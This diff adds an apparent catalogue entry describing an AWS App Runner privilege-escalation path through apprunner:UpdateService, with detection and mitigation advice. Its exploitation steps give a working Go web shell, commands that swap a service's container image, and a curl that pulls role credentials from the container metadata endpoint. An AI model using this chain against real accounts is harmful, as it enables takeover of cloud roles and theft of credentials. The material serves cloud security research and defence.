@@ -1,0 +1,118 @@
+id: apprunner-002
+name: apprunner:UpdateService
+category: access-resource
+services:
+- apprunner
+description: A principal with `apprunner:UpdateService` can modify an existing App Runner service's container image. If the
+  target service has a privileged IAM role attached, the attacker can update the service to use a malicious container image
+  (such as a web shell) and execute arbitrary code with the service's role permissions. This is similar to `lambda:UpdateFunctionCode`
+  but for containerized applications. Unlike creating a new service, this doesn't require `iam:PassRole` since the role is
+  already attached to the existing service.
+prerequisites:
+  admin:
+  - An App Runner service must exist with an IAM role attached
+  - The service's role must have administrative permissions
+  - Access to a container registry (ECR or public registry) to host the malicious image
+  lateral:
+  - An App Runner service must exist with an IAM role attached
+  - Access to a container registry (ECR or public registry) to host the malicious image
+exploitationSteps:
+  awscli:
+  - step: 1
+    command: aws apprunner list-services
+    description: List existing App Runner services to find targets with privileged roles
+  - step: 2
+    command: aws apprunner describe-service --service-arn SERVICE_ARN
+    description: Check the service's instance role ARN to confirm elevated permissions
+  - step: 3
+    command: |
+      cat > main.go << 'EOF'
+      package main
+      import (
+          "net/http"
+          "os/exec"
+      )
+      func handler(w http.ResponseWriter, r *http.Request) {
+          cmd := r.URL.Query().Get("cmd")
+          out, _ := exec.Command("sh", "-c", cmd).CombinedOutput()
+          w.Write(out)
+      }
+      func main() {
+          http.HandleFunc("/", handler)
+          http.ListenAndServe(":8080", nil)
+      }
+      EOF
+    description: Create a web shell that executes commands via URL parameters
+  - step: 4
+    command: |
+      docker build -t malicious-apprunner .
+      docker tag malicious-apprunner:latest PUBLIC_ECR_URI:latest
+      docker push PUBLIC_ECR_URI:latest
+    description: Build and push the malicious container image to a registry
+  - step: 5
+    command: |
+      aws apprunner update-service \
+        --service-arn SERVICE_ARN \
+        --source-configuration '{
+          "ImageRepository": {
+            "ImageIdentifier": "PUBLIC_ECR_URI:latest",
+            "ImageRepositoryType": "ECR_PUBLIC",
+            "ImageConfiguration": {
+              "Port": "8080"
+            }
+          }
+        }'
+    description: Update the existing service with the malicious container image
+  - step: 6
+    command: aws apprunner describe-service --service-arn SERVICE_ARN
+    description: Wait for the service to complete deployment and retrieve the service URL
+  - step: 7
+    command: |
+      curl "https://SERVICE_URL/?cmd=curl%20169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
+    description: Use the web shell to retrieve temporary credentials from the container metadata
+  - step: 8
+    command: |
+      export AWS_ACCESS_KEY_ID=<from step 7>
+      export AWS_SECRET_ACCESS_KEY=<from step 7>
+      export AWS_SESSION_TOKEN=<from step 7>
+      aws sts get-caller-identity
+    description: Use the stolen credentials to assume the privileged role's permissions
+recommendation: |
+  Restrict the `apprunner:UpdateService` permission using resource-based constraints.
+
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "apprunner:UpdateService",
+    "Resource": "arn:aws:apprunner:REGION:ACCOUNT_ID:service/SpecificService/HASH"
+  }
+  ```
+
+  Additional controls:
+  - Monitor CloudTrail for `UpdateService` events on sensitive App Runner services
+  - Implement container image scanning and require signed images
+  - Only allow images from approved ECR repositories using conditions
+  - Alert on source configuration changes to services with privileged roles
+  - Use AWS Config to detect unauthorized service updates
+  - Implement deployment approvals for production services
+  - Enable auto-deployments only from trusted source repositories
+discoveredBy:
+  name: Riyaz Walikar
+  organization: Appsecco
+  date: '2021'
+references:
+- title: Getting Shell and Data Access in AWS App Runner
+  url: https://blog.appsecco.com/getting-shell-and-data-access-in-aws-app-runner-3632e844bc77
+- title: HackTricks Cloud - AWS App Runner Privilege Escalation
+  url: https://cloud.hacktricks.wiki/pentesting-cloud/aws-security/aws-privilege-escalation/aws-apprunner-privesc
+relatedPaths:
+- apprunner-001
+- lambda-003
+- glue-002
+toolSupport:
+  pmapper: false
+  iamVulnerable: false
+permissions:
+  required:
+  - permission: apprunner:UpdateService
+    resourceConstraints: Target App Runner service must be in the Resource section
